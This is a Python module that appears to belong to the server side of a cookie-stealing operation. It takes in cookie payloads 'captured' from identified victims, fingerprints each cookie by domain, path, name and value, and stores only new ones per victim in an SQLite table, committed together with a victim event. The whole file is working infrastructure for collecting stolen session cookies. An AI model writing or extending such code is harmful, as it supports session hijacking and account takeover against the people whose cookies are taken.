"""Normalization and database-backed deduplication for captured cookies."""

from __future__ import annotations

import hashlib
import json
from typing import Any, Iterator

from sqlalchemy.dialects.sqlite import insert
from sqlalchemy.orm import Session

from models.captured_cookie import CapturedCookie


IDENTITY_FIELDS = ("storeId", "domain", "path", "name", "value")


def iter_captured_cookies(payload: Any) -> Iterator[dict[str, Any]]:
    """Yield recognizable cookie objects from single and bulk payloads."""
    if not isinstance(payload, dict):
        return

    cookies = payload.get("cookies")
    if isinstance(cookies, list):
        yield from (cookie for cookie in cookies if isinstance(cookie, dict))
        return

    if "name" in payload and "value" in payload:
        yield payload


def cookie_fingerprint(cookie: dict[str, Any]) -> str:
    """Identify a cookie value independently of expiry and flag changes."""
    identity = [str(cookie.get(field) or "") for field in IDENTITY_FIELDS]
    canonical = json.dumps(identity, ensure_ascii=False, separators=(",", ":"))
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()


def filter_new_cookie_payload(
    db: Session,
    victim_id: str,
    payload: dict[str, Any],
) -> tuple[dict[str, Any] | None, int]:
    """Reserve unseen cookie identities and remove duplicates from a payload.

    The reservation and the victim event are committed in the same transaction,
    while the composite primary key makes concurrent duplicate requests safe.
    """
    cookies = list(iter_captured_cookies(payload))
    if not cookies:
        return payload, 0

    new_cookies: list[dict[str, Any]] = []
    duplicate_count = 0
    for cookie in cookies:
        statement = (
            insert(CapturedCookie)
            .values(
                victim_id=victim_id,
                fingerprint=cookie_fingerprint(cookie),
            )
            .on_conflict_do_nothing(
                index_elements=["victim_id", "fingerprint"],
            )
        )
        if db.execute(statement).rowcount == 1:
            new_cookies.append(cookie)
        else:
            duplicate_count += 1

    if not new_cookies:
        return None, duplicate_count

    if isinstance(payload.get("cookies"), list):
        filtered = dict(payload)
        filtered["cookies"] = new_cookies
        filtered["count"] = len(new_cookies)
        return filtered, duplicate_count

    return payload, duplicate_count
